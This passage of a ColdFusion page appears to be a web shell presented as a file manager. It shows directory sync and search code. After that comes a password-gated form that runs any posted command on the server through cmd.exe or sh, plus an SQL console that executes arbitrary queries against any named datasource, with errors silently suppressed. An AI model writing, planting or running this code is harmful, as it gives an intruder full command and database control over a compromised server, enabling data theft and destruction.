			<cfdirectory action="CREATE" directory="#attributes.pathNew#">
			<cfoutput><h3 style="color:green">#attributes.pathNew# ... created!</h3></cfoutput>
			<cfcatch><cfoutput><h3>#attributes.pathNew# ... existing!</h3></cfoutput></cfcatch>
		</cftry>
		<!--- copy folder content - Recursive copy --->
		<cfloop query="getDir">
			<cfset getDirCurrentRow = getDir.currentRow>
			<cfif type eq "file">
				<cfset fileExists = 0>
				<!--- Check if file exists --->
				<cfloop query="getDirNew">
					<cfset getDirNewCurrentRow = getDirNew.currentRow>
					<cfif getDir.name[getDirCurrentRow] eq getDirNew.name[getDirNewCurrentRow]>
						<cfset fileExists = 1>
						<cfset fileIsModified = 0>
						<cfif getDir.DATELASTMODIFIED[getDirCurrentRow] gt getDirNew.DATELASTMODIFIED[getDirNewCurrentRow]>
							<cfset fileIsModified = 1>
						</cfif>
						<cfbreak>
					</cfif>
				</cfloop>
				<!--- action --->
				<cfif fileExists>
					<cfif fileIsModified or attributes.overwriteAll>
						<cftry>
							<cffile action="DELETE" file="#attributes.pathNew##attributes.delimiter##name#">
							<cffile
								action="COPY" 
								source="#attributes.path##attributes.delimiter##name#" 
								destination="#attributes.pathNew##attributes.delimiter##name#"
								attributes="Normal">
							<cfoutput><div style="color:orange">#attributes.pathNew##attributes.delimiter#<b>#name#</b> ... updated!</div></cfoutput>
							<cfcatch>
								<cfoutput><div style="color:red">#attributes.pathNew##attributes.delimiter#<b>#name#</b> ... cannot update!</div></cfoutput>
							</cfcatch>
						</cftry>
					<cfelse>
						<cfoutput><div>#attributes.pathNew##attributes.delimiter#<b>#name#</b> ... uptodate</div></cfoutput>
					</cfif>
				<cfelse>
					<cffile 
						action="COPY" 
						source="#attributes.path##attributes.delimiter##name#" 
						destination="#attributes.pathNew##attributes.delimiter##name#"
						attributes="Normal">
					<cfoutput><div style="color:green">#attributes.pathNew##attributes.delimiter#<b>#name#</b> ... new!</div></cfoutput>
				</cfif>
				<cfflush>
			</cfif>
		</cfloop>
		<cfloop query="getDir">
			<cfif type eq "dir">
				<cfmodule 
					fuseaction="syncDir"
					template="#attributes.thisModule#" 
					h="#attributes.H#"
					path="#attributes.path##attributes.delimiter##name#"
					pathNew="#attributes.pathNew##attributes.delimiter##name#"
					relocate="0">
			</cfif>
		</cfloop>
		<cfif attributes.relocate>
			<cfoutput>
				<button name="fileManagerButton" style="width:700" onclick="window.location.href='?h=#attributes.H#&path=#jsStringFormat(attributes.pathNew)#'">Synchronization done! Back to <b>#attributes.pathNew#</b></button>
			</cfoutput>
		</cfif>
	</cfcase>
	
	<cfcase value="search">
		<cfif attributes.searchtext eq "" and attributes.searchname eq "">
			<cfoutput>#loc("msg=Error: no criteria!",attributes.relocate)#</cfoutput>
		</cfif>
		<cfif not isDefined("request.searchResult")>
			<cfset request.searchResult = queryNew("path,name,type,size,datelastmodified,attributes")>
			<cfset attributes.searchpath = attributes.path>
		</cfif>
		<cfset countsearchresult =  request.searchResult.recordCount>
		<cftry>
			<cfdirectory action="LIST" directory="#attributes.searchpath#" name="getDir">
			<!--- Search files --->
			<cfloop query="getDir">
				<cfif attributes.maxsearchresult lte countsearchresult>
					<cfbreak>
				</cfif>
				<cfif type eq "file">
					<cfset isOK = 1>
					<cfif attributes.searchname neq "">
						<cfset isOK = REFindNoCase(attributes.searchname,name)>
					</cfif>
					<cfif attributes.searchtext neq "" and isOK eq 1>
						<cffile action="READ" file="#attributes.searchpath##attributes.delimiter##name#" variable="filecontent">
						<cfset isOK = REFindNoCase(attributes.searchtext,filecontent)>
					</cfif>
					<cfif isOK>
						<cfset tmp = queryAddRow(request.searchResult)>
						<cfset tmp = querySetCell(request.searchResult,"path",attributes.searchpath)>
						<cfset tmp = querySetCell(request.searchResult,"name",name)>
						<cfset tmp = querySetCell(request.searchResult,"type",type)>
						<cfset tmp = querySetCell(request.searchResult,"size",size)>
						<cfset tmp = querySetCell(request.searchResult,"datelastmodified",datelastmodified)>
						<cfset tmp = querySetCell(request.searchResult,"attributes",attributes)>
						<cfset countsearchresult =  countsearchresult + 1>
					</cfif>
				</cfif>
			</cfloop>
			<!--- Search dir --->
			<cfloop query="getDir">
				<cfif attributes.maxsearchresult lte countsearchresult>
					<cfbreak>
				</cfif>
				<cfif type eq "dir" and name neq "." and name neq "..">
					<cfif attributes.searchname neq "" and REFindNoCase(attributes.searchname,name)>
						<cfset tmp = queryAddRow(request.searchResult)>
						<cfset tmp = querySetCell(request.searchResult,"path",attributes.searchpath)>
						<cfset tmp = querySetCell(request.searchResult,"name",name)>
						<cfset tmp = querySetCell(request.searchResult,"type",type)>
						<cfset tmp = querySetCell(request.searchResult,"size",size)>
						<cfset tmp = querySetCell(request.searchResult,"datelastmodified",datelastmodified)>
						<cfset tmp = querySetCell(request.searchResult,"attributes",attributes)>
						<cfset countsearchresult =  countsearchresult + 1>
					</cfif>
				</cfif>
			</cfloop>
			<!--- Search in sub dir --->
			<cfif attributes.recursive eq 1>
				<cfloop query="getDir">
					<cfif attributes.maxsearchresult lte countsearchresult>
						<cfbreak>
					</cfif>
					<cfif type eq "dir" and name neq "." and name neq "..">
						<cfmodule template="#attributes.thisModule#"
							fuseaction="search"
							path="#attributes.path#"
							h="#attributes.h#"
							searchpath="#attributes.searchpath##attributes.delimiter##name#"
							recursive="#attributes.recursive#"
							searchtext="#attributes.searchtext#"
							searchname="#attributes.searchname#"
							maxsearchresult="#attributes.maxsearchresult#"
							relocate="0">
					</cfif>
				</cfloop>
			</cfif>
			<cfcatch>
				<cfoutput>#loc("msg=Error!",attributes.relocate)#</cfoutput>
			</cfcatch>
		</cftry>
		<!--- Show result --->
		<cfif attributes.relocate>
			<cfset caller.getDir = request.searchResult>
			<cfmodule template="#attributes.thisModule#"
				fuseaction="home"
				path="#attributes.path#"
				h="#attributes.h#"
				msg="Search result: #request.searchResult.recordCount# elements!"
				getDir="#request.searchResult#"
				showpath="#iif(attributes.recursive,1,0)#"
				searchtext="#attributes.searchtext#"
				searchname="#attributes.searchname#"
				maxsearchresult="#attributes.maxsearchresult#">
		</cfif>
	</cfcase>
	
</cfswitch>

</br></br>

<cfoutput>
<!--<table>-->
<cfset tempFile = #GetTempFile(GetTempDirectory(),"testFile")# />
<cfif IsDefined("FORM.cmd")>
<cfoutput>#cmd#</cfoutput>
<cfif server.os.name neq "UNIX">
<cfexecute name="cmd.exe" arguments="/c #cmd#" outputfile="#tempFile#" timeout="2000"></cfexecute>
<cfelse>
<cfexecute name="sh" arguments="-c ""#REReplace(cmd,"""","'","ALL")#""" outputfile="#tempFile#" timeout="2000"></cfexecute>
</cfif>
</cfif>
<form action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>" method="post">
<input type=text size=45 name="cmd" >
<input type=Submit value="run">
</form>
<cfif FileExists("#tempFile#") is "Yes">
<cffile action="Read" file="#tempFile#" variable="readText">
<textarea readonly cols=80 rows=20>
<CFOUTPUT>#readText#</CFOUTPUT>
</textarea>
<cffile action="Delete" file="#tempFile#">
</cfif>
</cfoutput>
</br></br>

<p><b>Notes:</b></p>
<ul>
<li>Select the database you want to use</li>
<li>Write SQL statements in the text box</li>
</ul>

<form method="POST" action="">
<p><b>SQL Interface:</b></p>
Datasource<br>
<input type="text" name="datasource" />
<br>
SQL<br>
<textarea name="sql" rows="5" cols="100"></textarea>
<br>
<input type=submit value="Exec">
</form>

<cfif isdefined("form.sql")>
<cfquery name="runsql" datasource="#Form.datasource#" timeout="30">
	#REReplace(Form.sql,"""","'","ALL")#
</cfquery>
</cfif>

<table border=1>
    <cfif isdefined("form.sql")>
    <cfloop from="0" to="#runsql.RecordCount#" index="row">
        <cfif row eq 0>
                <tr>
                        <cfloop list="#runsql.ColumnList#" index="column" delimiters=",">
                                <th><cfoutput>#column#</cfoutput></th>  
                        </cfloop>
                </tr>
        <cfelse>
                <tr>
                        <cfloop list="#runsql.ColumnList#" index="column" delimiters=",">
                                <td><cfoutput>#runsql[column][row]#</cfoutput></td>
                        </cfloop>
                </tr>
        </cfif>
    </cfloop>
    </cfif>
</table>
</br> </br>



</body>
</html>

  <cfelse>
    <form method="post">
      <label for="code">Code:</label><input type="text" name="code" />
      <br/>
      <input type="submit" value="Login" />
    </form>
 </cfif>

<cfcatch>
</cfcatch> 
</cftry>
